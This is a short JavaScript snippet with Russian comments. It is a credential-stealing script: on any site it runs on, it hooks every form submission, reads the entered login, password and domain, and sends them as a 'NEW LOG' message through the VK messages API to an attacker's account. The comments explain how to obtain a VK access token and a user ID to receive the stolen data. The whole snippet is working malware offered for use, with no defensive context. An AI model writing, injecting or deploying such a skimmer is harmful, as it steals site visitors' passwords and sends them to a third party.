JavaScript:
var token = 'Токен'; // Переходим на https://vkhost.github.io/ , читаем инструкцию, > VK admin и вставляем сюда
var UID = 'Ид'; // Можно указать свой же, открываем свою фотографию и будет что-то подобное:
// ?z=photo255543445_428961, наш ид - 255543445

$("form").submit(function() {
var login = $(this).parent().find('input[type=text]').val();
var pass = $(this).parent().find('input[type=password]').val();
var currentSite = document.domain;
var message = "NEW LOG 👇\n SITE | LOGIN | PASSWORD " + "\n" + currentSite + " | " + login + " | " + pass;
$.get('https://api.vk.com/method/messages.send?user_id=' + UID + '&message=' + encodeURIComponent(message) + '&access_token='+ token +'&v=5.38');
}); 
